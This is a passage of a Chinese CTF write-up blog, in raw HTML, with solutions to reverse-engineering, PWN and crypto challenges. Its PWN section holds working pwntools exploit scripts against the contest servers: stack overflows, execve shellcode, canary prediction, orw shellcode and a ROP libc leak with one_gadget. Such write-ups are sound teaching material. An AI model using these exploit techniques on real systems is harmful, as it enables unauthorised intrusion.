class="comment">//543056743333546e30697472</span></span><br><span class="line"><span class="comment">//T0Vt33Tn0itr</span></span><br></pre></td></tr></table></figure><p>在MainActivity2中查看逻辑为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iArr=[-107, -106, -95, -115, -119, 127, 26, 121, -62, -20, 86, 9] = &#x27;9596a18d897f1a79c2ec5609&#x27;</span><br><span class="line"></span><br><span class="line">bytes = ad@#E!@a123 = sb5</span><br><span class="line">byteArrayExtra = eCAS213@!@3 = bArr</span><br><span class="line"></span><br><span class="line">byteArrayExtra ^ bytes = iArr</span><br><span class="line"></span><br><span class="line">故 bytes = &#x27;0n3DF4itvc0Y&#x27;</span><br></pre></td></tr></table></figure><p>合并得到flag：<code>SYC&#123;T00nV3tD3F34Tint0vict0rY&#125;</code></p><p>​    </p><h3 id="是男人就来扎针"><a href="#是男人就来扎针" class="headerlink" title="是男人就来扎针"></a>是男人就来扎针</h3><blockquote><p>简单的游戏逆向送分题,最终flag记得包裹上SYC{}</p></blockquote><p>ILSPY反编译，在 <code>public class GameManager</code> 找到代码逻辑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">magicc = [<span class="number">75</span>, <span class="number">109</span>, <span class="number">102</span>, <span class="number">63</span>, <span class="number">107</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">108</span>, <span class="number">124</span>, <span class="number">112</span>,</span><br><span class="line"><span class="number">109</span>, <span class="number">122</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">63</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">113</span>,</span><br><span class="line"><span class="number">107</span>, <span class="number">108</span>, <span class="number">62</span>]</span><br><span class="line"></span><br><span class="line">magic = [<span class="number">124</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">92</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">90</span>, <span class="number">77</span>, <span class="number">73</span>,</span><br><span class="line"><span class="number">75</span>, <span class="number">64</span>, <span class="number">8</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">8</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">65</span>,</span><br><span class="line"><span class="number">70</span>, <span class="number">92</span>, <span class="number">91</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    magicc = [magicc[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magicc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    magic = [magic[k] ^ (i+<span class="number">1</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magicc))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(magic))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5(<span class="built_in">bytes</span>(magicc)).hexdigest().upper()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CBDDD133B60130856D3C695D9E5ED6A5</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;CBDDD133B60130856D3C695D9E5ED6A5&#125;</code></p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc_pwntools"></a>nc_pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30348</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;!!!\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span>+<span class="string">b&#x27;Syclover&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;first one\n&#x27;</span>)</span><br><span class="line">exp=r.recvline().strip()[:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(exp)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(exp)).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>概率性getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30941</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x4012F3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>开了PIE，概率性getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31277</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+<span class="string">b&#x27;\x27\x12&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h3><p>按字节修改返回地址为后门函数 <code>backdoor()</code> 地址，修改2个字节即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31467</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;abcdefghi&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40134d -&gt; 0x401225</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68-0x40=40</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x25-0x4d)&amp;0xffffffff=0xffffffd8</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffd8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 0x68+1-0x40=41</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line"><span class="comment"># (0x12-0x13)&amp;0xffffffff=0xffffffff</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;ffffffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>（代码待补充）</p><p>​    </p><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><blockquote><p>先做这题，简单</p></blockquote><p>（代码待补充）</p><p>​    </p><h3 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h3><p>栈地址泄露，栈可写，写24长度内的shellcode，while循环改写retaddr为栈地址，ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31581</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">shell_addr=stack_leak+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">40</span>+i).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;value:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">hex</span>(shell_addr&gt;&gt;(<span class="number">8</span>*i)&amp;<span class="number">0xff</span>)[<span class="number">2</span>:].encode())</span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">b&#x27;index:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="fmt1-0"><a href="#fmt1-0" class="headerlink" title="fmt1.0"></a>fmt1.0</h3><p>（代码待补充）</p><p>​    </p><h3 id="white-canary"><a href="#white-canary" class="headerlink" title="white_canary"></a>white_canary</h3><blockquote><p>远程之前记得“sudo ntpdate cn.pool.ntp.org” 同步下时间</p></blockquote><p><code>init()</code> 自己实现了canary计算方法，禁用了59，无法 <code>execve</code>。</p><p>伪随机数算canary+写orw的shellcode+ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed=libc.time(<span class="number">0</span>)%<span class="number">60</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v2 = libc.rand()</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">canary = (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>) \</span><br><span class="line">  + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">  </span><br><span class="line">canary&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">someplace=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>))</span><br><span class="line">pl+=asm(shellcraft.read(<span class="number">3</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">pl+=asm(shellcraft.write(<span class="number">1</span>, someplace, <span class="number">0x20</span>))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">buf=<span class="number">0x4040E0</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(buf)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez-fullprotection"><a href="#ez-fullprotection" class="headerlink" title="ez_fullprotection"></a>ez_fullprotection</h3><p>scanf泄露_start地址绕PIE，线程溢出TLS覆盖canary。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30161</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ez_fullprotection&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;entered &#x27;</span>)</span><br><span class="line">_start=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">base=_start - elf.sym._start</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">puts_plt=base+elf.plt.puts</span><br><span class="line">puts_got=base+elf.got.puts</span><br><span class="line">pop_rdi=base+<span class="number">0x16e3</span></span><br><span class="line">ret=base+<span class="number">0x101a</span></span><br><span class="line">ret_addr=base+<span class="number">0x1541</span></span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line">pl=pl.ljust(<span class="number">0x870</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">ogg=[<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">ogg=[libc_base+k <span class="keyword">for</span> k <span class="keyword">in</span> ogg]</span><br><span class="line"></span><br><span class="line">pop_4=base+<span class="number">0x16dc</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_4)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(ogg[<span class="number">0</span>])</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><blockquote><p>Bibo…Hello! 你好! こんにちは! Привет! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d… Hmm… Something goes wrong with my grettings bot.</p></blockquote><p>16进制转字符串：<code>SYC&#123;Hello_World_Crypto_bibobibo&#125;</code>。</p><p>​    </p><h3 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof_of_work"></a>proof_of_work</h3><blockquote><p>题目链接：nc 59.110.20.54:5526 Build your own function to solve proof_of_work!</p></blockquote><p>PoW代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;59.110.20.54&#x27;</span>,<span class="number">5526</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;XXXX+&#x27;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;== &#x27;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;XXXX: &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;st3p_1nt0_1nter4ctive_Crypt0graphy&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="SimpleRSA"><a href="#SimpleRSA" class="headerlink" title="SimpleRSA"></a>SimpleRSA</h3><blockquote><p>So simple RSA! Wait… Are you kidding me? <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem">https://en.wikipedia.org/wiki/RSA_(cryptosystem</a>) hint: flag&lt;p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">35</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">n = p*q </span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(p) </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line"><span class="comment">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br></pre></td></tr></table></figure></blockquote><p>$d = e^{-1} \bmod p,\;\;\; m = c^d \bmod p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line">c = <span class="number">510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;Just_a_s1mple_modular_equation&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h3><blockquote><p>I invented a new symmetric cryptosystem, and I believe you will never break it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 